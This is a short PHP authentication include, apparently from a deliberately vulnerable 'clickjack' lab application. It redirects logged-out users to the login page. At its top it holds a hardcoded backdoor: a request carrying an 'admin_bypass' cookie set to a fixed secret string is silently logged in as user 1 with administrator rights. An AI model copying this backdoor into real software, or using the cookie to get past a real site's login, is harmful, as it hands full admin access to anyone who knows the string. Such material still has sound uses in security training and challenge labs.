<?php
	session_start();
	if($_COOKIE['admin_bypass'] === "ncjsdkalflrheulghjfdnsfhdsjkhjk") {
	  $_SESSION['userid'] = 1;
	  $_SESSION['admin'] = 1;
	}
	if($_SERVER['REQUEST_URI'] !== "/clickjack/login.php" && $_SERVER['REQUEST_URI'] !== "/clickjack/register.php") {
	if((!isset($_SESSION['userid']) || $_SESSION['userid'] === 0)) {
		header("Location: login.php");
		die();
	}
}
?>
